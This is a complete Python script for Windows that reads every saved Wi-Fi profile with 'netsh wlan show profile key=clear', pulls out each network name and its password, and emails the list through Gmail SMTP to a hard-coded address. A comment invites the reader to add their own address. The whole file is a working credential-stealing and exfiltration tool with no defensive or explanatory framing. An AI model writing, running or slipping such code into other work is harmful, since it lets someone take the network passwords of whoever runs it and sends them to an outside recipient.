import subprocess
import re
import smtplib
from email.message import EmailMessage
import os

EMAIL_ADDR = os.environ.get('EMAIL_ADDRESS')
EMAIL_PSWD = os.environ.get('EMAIL_PASSWORD')

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, shell=True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
wifi_list = []
cmd = ["netsh", "wlan", "show", "profile"]
if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        profile_info = subprocess.run(cmd + [name], capture_output=True, shell=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(cmd + [name, "key=clear"], capture_output=True, shell=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password is None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
        wifi_list.append(wifi_profile)


msg = EmailMessage()
msg['From'] = 'mkpro118@gmail.com'
msg['To'] = ['mkpro118@gmail.com', ]  # add your email after the comma if you want to. Please wrap it with single( '' ) or double quotes ( "" )

content = ''
for i in wifi_list:
    content += f"SSID: {i['ssid']} | PASSWORD: {i['password']}\n\n"

msg.set_content(content)
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
    s.login(EMAIL_ADDR, EMAIL_PSWD)
    s.send_message(msg)
